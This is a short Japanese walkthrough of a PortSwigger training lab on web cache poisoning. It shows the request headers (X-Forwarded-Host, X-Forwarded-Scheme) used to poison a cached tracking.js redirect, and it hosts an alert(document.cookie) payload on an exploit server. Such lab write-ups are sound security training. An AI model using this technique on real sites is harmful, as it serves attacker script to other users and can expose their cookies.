# 複数のヘッダーによる Web キャッシュ ポイズニング

以下のハッキングラボを実施  
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers  
このラボには、複数のヘッダーを使用して悪意のあるリクエストを作成した場合にのみ悪用可能な Web キャッシュ ポイズニングの脆弱性が含まれています。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます

* 2. ハッキングラボにアクセスします
* 3. 以下のリクエストを send to repeater します

```
GET /resources/js/tracking.js HTTP/2
```

- 4. リクエストに以下のヘッダーを付加して送信します

```
X-Forwarded-Host: example.com
X-Forwarded-Scheme: http
```

レスポンスでリダイレクト先が次のようにセットされます

```
Location: https://example.com/product?productId=1
```

- 5.  エクスプロイトサーバに移動します
- 6.  ファイル名を /resources/js/tracking.js、ボディに alert(document.cookie)をセットして、保存します
- 7.  リピーターのリクエストヘッダーを変更します

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

- 8.  X-Cache:hit のレスポンスが返るまで上記リクエストを送信します
- 9.  ブラウザをリロードするとスクリプトが実行されます
